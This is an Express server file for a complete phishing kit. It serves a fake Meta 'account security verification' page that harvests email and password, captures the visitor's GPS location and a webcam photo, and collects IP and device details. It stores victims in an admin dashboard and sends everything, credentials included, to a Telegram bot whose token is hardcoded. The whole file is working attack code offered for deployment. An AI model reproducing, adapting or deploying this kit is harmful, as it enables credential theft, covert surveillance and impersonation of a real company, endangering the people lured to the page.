// server.js - Advanced Tracking System for Vercel
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');

const app = express();

// Vercel environment configuration
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';

// Initialize Telegram Bot (only if token is provided)
let bot;
if (BOT_TOKEN && BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    bot = new TelegramBot(BOT_TOKEN, { polling: false });
    console.log('🤖 Telegram Bot Initialized');
} else {
    console.log('⚠️  Telegram Bot Token not configured');
}

// In-memory storage
const victims = new Map();
let analytics = {
    total: 0,
    byCountry: {},
    byDevice: {},
    byBrowser: {},
    photos: 0,
    locations: 0
};

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Helper function to generate HTML
const generateHTML = (victimId) => `
<!DOCTYPE html>
<html>
<head>
    <title>Account Security Verification - Meta</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
            color: #1c1e21;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            overflow: hidden;
        }
        .header {
            background: #1877f2;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .content {
            padding: 20px;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
        }
        button {
            background: #1877f2;
            color: white;
            border: none;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background: #166fe5;
        }
        .video-container {
            width: 100%;
            height: 300px;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
            position: relative;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .capture-btn {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255,255,255,0.2);
            border: 3px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
        .loading {
            text-align: center;
            padding: 40px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            text-align: center;
            padding: 40px;
            color: #42b72a;
        }
        .success-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        #locationInfo, #systemInfo {
            background: #f0f2f5;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            font-size: 14px;
        }
        .permission-item {
            margin: 15px 0;
        }
        .permission-item input {
            width: auto;
            margin-right: 10px;
        }
        #preview {
            width: 100%;
            height: 300px;
            object-fit: cover;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Security Verification</h1>
            <p>Meta Account Protection</p>
        </div>
        
        <div class="content">
            <!-- Step 1: Login -->
            <div class="step active" id="step1">
                <h3>Account Verification Required</h3>
                <p>To protect your account, please verify your identity.</p>
                <input type="text" id="email" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button onclick="nextStep()">Continue</button>
            </div>
            
            <!-- Step 2: Permissions -->
            <div class="step" id="step2">
                <h3>Security Permissions</h3>
                <p>Enable these permissions for enhanced security:</p>
                
                <div class="permission-item">
                    <input type="checkbox" id="location" checked>
                    <label for="location">📍 Allow location access</label>
                </div>
                
                <div class="permission-item">
                    <input type="checkbox" id="camera" checked>
                    <label for="camera">📸 Allow camera access for face verification</label>
                </div>
                
                <button onclick="requestPermissions()">Allow & Continue</button>
                <button onclick="prevStep()" style="background: #8a8d91; margin-top: 10px;">Back</button>
            </div>
            
            <!-- Step 3: Location -->
            <div class="step" id="step3">
                <h3>📍 Location Verification</h3>
                <p>Getting your location...</p>
                <div id="locationInfo"></div>
                <button onclick="getLocation()" id="getLocationBtn">Get My Location</button>
                <button onclick="nextStep()" id="continueBtn" style="display:none;">Continue to Camera</button>
                <button onclick="prevStep()" style="background: #8a8d91; margin-top: 10px;">Back</button>
            </div>
            
            <!-- Step 4: Camera -->
            <div class="step" id="step4">
                <h3>📸 Face Verification</h3>
                <p>Please look at the camera and smile!</p>
                
                <div class="video-container">
                    <video id="video" autoplay></video>
                    <canvas id="canvas" style="display:none;"></canvas>
                    <div class="capture-btn" onclick="capturePhoto()">
                        📸
                    </div>
                </div>
                
                <img id="preview" alt="Captured Photo">
                
                <div id="cameraControls">
                    <button onclick="capturePhoto()">Capture Photo</button>
                    <button onclick="nextStep()" id="usePhotoBtn" style="display:none; background: #42b72a;">Use This Photo</button>
                    <button onclick="skipCamera()" style="background: #8a8d91; margin-top: 10px;">Skip Camera</button>
                    <button onclick="prevStep()" style="background: #8a8d91; margin-top: 10px;">Back</button>
                </div>
            </div>
            
            <!-- Step 5: System Info -->
            <div class="step" id="step5">
                <h3>🖥️ Device Verification</h3>
                <p>Collecting device information...</p>
                <div id="systemInfo"></div>
                <button onclick="collectSystemInfo()">Collect Information</button>
                <button onclick="prevStep()" style="background: #8a8d91; margin-top: 10px;">Back</button>
            </div>
            
            <!-- Loading -->
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <h3>Securing Your Account...</h3>
                <p id="loadingStatus">Please wait</p>
            </div>
            
            <!-- Success -->
            <div class="success" id="success">
                <div class="success-icon">✅</div>
                <h3>Verification Complete!</h3>
                <p>Your account is now secure.</p>
                <p>Redirecting to Facebook...</p>
            </div>
        </div>
    </div>

    <script>
        const victimId = '${victimId}';
        let userData = {
            victimId: victimId,
            credentials: {},
            location: {},
            photo: null,
            system: {},
            ip: '',
            timestamp: new Date().toISOString()
        };
        
        let currentStep = 1;
        let cameraStream = null;
        
        function showStep(step) {
            document.querySelectorAll('.step').forEach(s => s.style.display = 'none');
            document.getElementById('step' + step).style.display = 'block';
            currentStep = step;
            
            // Start camera when step 4 is shown
            if (step === 4) {
                setTimeout(startCamera, 100);
            }
        }
        
        function nextStep() {
            if (currentStep === 1) {
                userData.credentials = {
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value
                };
                
                if (!userData.credentials.email || !userData.credentials.password) {
                    alert('Please enter both email and password.');
                    return;
                }
            }
            
            if (currentStep < 5) {
                showStep(currentStep + 1);
            }
        }
        
        function prevStep() {
            if (currentStep > 1) {
                showStep(currentStep - 1);
            }
        }
        
        function requestPermissions() {
            const locationPerm = document.getElementById('location').checked;
            const cameraPerm = document.getElementById('camera').checked;
            
            if (!locationPerm && !cameraPerm) {
                alert('At least one permission is required for security verification.');
                return;
            }
            
            showStep(3);
            
            if (locationPerm) {
                getLocation();
            } else {
                document.getElementById('continueBtn').style.display = 'block';
            }
        }
        
        function getLocation() {
            const infoDiv = document.getElementById('locationInfo');
            const continueBtn = document.getElementById('continueBtn');
            
            infoDiv.innerHTML = '<p>Requesting location access...</p>';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userData.location = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude
                        };
                        
                        infoDiv.innerHTML = \`
                            <p><strong>📍 Location captured!</strong></p>
                            <p>Latitude: \${userData.location.lat.toFixed(6)}</p>
                            <p>Longitude: \${userData.location.lon.toFixed(6)}</p>
                            <p>Accuracy: \${userData.location.accuracy} meters</p>
                        \`;
                        
                        continueBtn.style.display = 'block';
                        document.getElementById('getLocationBtn').style.display = 'none';
                        
                        // Get address
                        getAddress(userData.location.lat, userData.location.lon);
                    },
                    (error) => {
                        infoDiv.innerHTML = \`
                            <p><strong>⚠️ Location access denied</strong></p>
                            <p>Error: \${error.message}</p>
                        \`;
                        continueBtn.style.display = 'block';
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                infoDiv.innerHTML = '<p>Geolocation not supported.</p>';
                continueBtn.style.display = 'block';
            }
        }
        
        async function getAddress(lat, lon) {
            try {
                const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}\`);
                const data = await response.json();
                if (data.display_name) {
                    userData.location.address = data.display_name;
                    const infoDiv = document.getElementById('locationInfo');
                    infoDiv.innerHTML += \`<p>Address: \${data.display_name}</p>\`;
                }
            } catch (error) {
                console.log('Address lookup failed');
            }
        }
        
        function startCamera() {
            const video = document.getElementById('video');
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                })
                .then(stream => {
                    video.srcObject = stream;
                    cameraStream = stream;
                    video.style.display = 'block';
                })
                .catch(error => {
                    console.error('Camera error:', error);
                    document.getElementById('video').innerHTML = 
                        '<p style="color:white; text-align:center; padding: 40px;">Camera access denied</p>';
                });
            }
        }
        
        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const preview = document.getElementById('preview');
            const useBtn = document.getElementById('usePhotoBtn');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            userData.photo = photoData;
            
            preview.src = photoData;
            preview.style.display = 'block';
            video.style.display = 'none';
            useBtn.style.display = 'block';
        }
        
        function skipCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            showStep(5);
        }
        
        async function collectSystemInfo() {
            const infoDiv = document.getElementById('systemInfo');
            infoDiv.innerHTML = '<p>Collecting information...</p>';
            
            // Get IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userData.ip = ipData.ip;
                
                // Get IP info
                const ipInfo = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
                const ipInfoData = await ipInfo.json();
                userData.ipInfo = ipInfoData;
            } catch (error) {
                console.log('IP detection failed');
            }
            
            // System info
            userData.system = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen: \`\${window.screen.width}x\${window.screen.height}\`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                deviceMemory: navigator.deviceMemory || 'unknown'
            };
            
            // Network info
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                userData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt
                };
            }
            
            infoDiv.innerHTML = \`
                <p><strong>✅ Information collected!</strong></p>
                <p>IP: \${userData.ip || 'Unknown'}</p>
                <p>Browser: \${navigator.userAgent.split(' ')[0]}</p>
                <p>Screen: \${userData.system.screen}</p>
                <p>Timezone: \${userData.system.timezone}</p>
            \`;
            
            // Auto-proceed
            setTimeout(completeTracking, 1500);
        }
        
        async function completeTracking() {
            showStep('loading');
            const status = document.getElementById('loadingStatus');
            
            status.textContent = 'Sending verification data...';
            
            try {
                const response = await fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
                
                if (response.ok) {
                    status.textContent = 'Verification successful!';
                    
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('success').style.display = 'block';
                        
                        // Redirect after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://facebook.com';
                        }, 2000);
                    }, 1500);
                }
            } catch (error) {
                status.textContent = 'Error: ' + error.message;
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            }
            
            // Clean up
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        }
        
        // Initialize
        showStep(1);
    </script>
</body>
</html>
`;

// Routes
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    res.send(generateHTML(victimId));
});

app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'online', 
        victims: victims.size,
        uptime: process.uptime()
    });
});

app.post('/track', async (req, res) => {
    try {
        const trackingData = req.body;
        
        // Validate data
        if (!trackingData.victimId || !trackingData.credentials) {
            return res.status(400).json({ error: 'Invalid data' });
        }
        
        // Get more IP info if not present
        if (trackingData.ip && !trackingData.ipInfo) {
            try {
                const ipInfo = await axios.get(`https://ipapi.co/${trackingData.ip}/json/`, {
                    timeout: 5000
                });
                trackingData.ipInfo = ipInfo.data;
            } catch (ipError) {
                console.log('IP info fetch failed:', ipError.message);
            }
        }
        
        // Store in memory
        trackingData.timestamp = new Date().toISOString();
        victims.set(trackingData.victimId, trackingData);
        
        // Update analytics
        updateAnalytics(trackingData);
        
        // Send to Telegram if bot is configured
        if (bot && CHAT_ID) {
            await sendToTelegram(trackingData);
        }
        
        res.json({ 
            success: true, 
            message: 'Verification complete',
            redirect: 'https://facebook.com'
        });
        
    } catch (error) {
        console.error('Tracking error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin endpoints
app.get('/admin', (req, res) => {
    const victimList = Array.from(victims.values()).slice(-20).reverse();
    
    const adminHTML = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            body { font-family: Arial; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
            .stat-card { background: #f5f5f5; padding: 20px; border-radius: 8px; }
            .victim-list { margin-top: 30px; }
            .victim-item { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 6px; }
            pre { background: #f8f8f8; padding: 10px; overflow: auto; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Tracking Dashboard</h1>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>Total Victims</h3>
                    <p>${victims.size}</p>
                </div>
                <div class="stat-card">
                    <h3>Photos Captured</h3>
                    <p>${analytics.photos}</p>
                </div>
                <div class="stat-card">
                    <h3>Locations</h3>
                    <p>${analytics.locations}</p>
                </div>
                <div class="stat-card">
                    <h3>Countries</h3>
                    <p>${Object.keys(analytics.byCountry).length}</p>
                </div>
            </div>
            
            <div class="victim-list">
                <h2>Recent Victims</h2>
                ${victimList.map(v => `
                    <div class="victim-item">
                        <strong>${v.credentials.email}</strong>
                        <p>IP: ${v.ip || 'N/A'} | Location: ${v.location.lat ? '✅' : '❌'} | Photo: ${v.photo ? '✅' : '❌'}</p>
                        <p>Time: ${new Date(v.timestamp).toLocaleString()}</p>
                        <button onclick="viewDetails('${v.victimId}')">View Details</button>
                        <div id="details-${v.victimId}" style="display:none; margin-top:10px;">
                            <pre>${JSON.stringify(v, null, 2)}</pre>
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>
        
        <script>
            function viewDetails(id) {
                const details = document.getElementById('details-' + id);
                details.style.display = details.style.display === 'none' ? 'block' : 'none';
            }
        </script>
    </body>
    </html>
    `;
    
    res.send(adminHTML);
});

app.get('/api/victims', (req, res) => {
    res.json(Array.from(victims.values()));
});

app.get('/api/stats', (req, res) => {
    res.json(analytics);
});

// Helper functions
function generateVictimId(req) {
    const crypto = require('crypto');
    const uniqueString = Date.now() + Math.random() + (req.ip || '') + (req.headers['user-agent'] || '');
    return crypto.createHash('md5').update(uniqueString).digest('hex').substring(0, 12);
}

function updateAnalytics(data) {
    analytics.total++;
    
    // Photos
    if (data.photo) analytics.photos++;
    
    // Locations
    if (data.location && data.location.lat) analytics.locations++;
    
    // Country
    if (data.ipInfo && data.ipInfo.country_name) {
        const country = data.ipInfo.country_name;
        analytics.byCountry[country] = (analytics.byCountry[country] || 0) + 1;
    }
    
    // Device type
    const isMobile = /mobile/i.test(data.system?.userAgent || '');
    const deviceType = isMobile ? 'Mobile' : 'Desktop';
    analytics.byDevice[deviceType] = (analytics.byDevice[deviceType] || 0) + 1;
    
    // Browser
    const ua = data.system?.userAgent || '';
    let browser = 'Unknown';
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    analytics.byBrowser[browser] = (analytics.byBrowser[browser] || 0) + 1;
}

async function sendToTelegram(data) {
    try {
        if (!bot || !CHAT_ID) return;
        
        // Build message
        let message = `🚨 *NEW VICTIM TRACKED* 🚨\n\n`;
        
        // Credentials
        message += `*📧 Credentials:*\n`;
        message += `Email: \`${data.credentials.email}\`\n`;
        message += `Password: \`${data.credentials.password}\`\n\n`;
        
        // IP Info
        message += `*🌐 IP Information:*\n`;
        message += `IP: \`${data.ip}\`\n`;
        if (data.ipInfo) {
            message += `Country: ${data.ipInfo.country_name || 'N/A'}\n`;
            message += `City: ${data.ipInfo.city || 'N/A'}\n`;
            message += `ISP: ${data.ipInfo.org || 'N/A'}\n`;
        }
        
        // Location
        message += `\n*📍 Location:*\n`;
        if (data.location.lat) {
            message += `GPS: ${data.location.lat}, ${data.location.lon}\n`;
            message += `Accuracy: ${data.location.accuracy || 'N/A'}m\n`;
            message += `Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n`;
        } else {
            message += `Not available\n`;
        }
        
        // Device
        message += `\n*🖥️ Device:*\n`;
        message += `Browser: ${data.system.userAgent?.split(' ')[0] || 'N/A'}\n`;
        message += `Screen: ${data.system.screen || 'N/A'}\n`;
        message += `Timezone: ${data.system.timezone || 'N/A'}\n`;
        
        // Time
        message += `\n*⏰ Time:* ${new Date(data.timestamp).toLocaleString()}\n`;
        
        // Send text message
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Send location on map
        if (data.location.lat && data.location.lon) {
            await bot.sendLocation(CHAT_ID, data.location.lat, data.location.lon);
        }
        
        // Send photo if available
        if (data.photo) {
            try {
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
                const buffer = Buffer.from(base64Data, 'base64');
                
                await bot.sendPhoto(CHAT_ID, buffer, {
                    caption: '📸 Captured Photo - Face Verification'
                });
            } catch (photoError) {
                console.log('Failed to send photo:', photoError.message);
            }
        }
        
        console.log('✅ Data sent to Telegram');
        
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

// Health check endpoint for Vercel
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy',
        timestamp: new Date().toISOString(),
        victims: victims.size,
        uptime: process.uptime()
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>404 - Page Not Found</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                h1 { color: #1877f2; }
                a { color: #1877f2; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>The page you're looking for doesn't exist.</p>
            <p><a href="/">Go to Security Verification</a></p>
        </body>
        </html>
    `);
});

// Error handler
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// Start server (for local development)
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🌐 Access: http://localhost:${PORT}`);
        console.log(`🔧 Admin: http://localhost:${PORT}/admin`);
        console.log(`📊 API: http://localhost:${PORT}/api/stats`);
        console.log(`❤️  Health: http://localhost:${PORT}/health`);
    });
}

// Export for Vercel
module.exports = app;
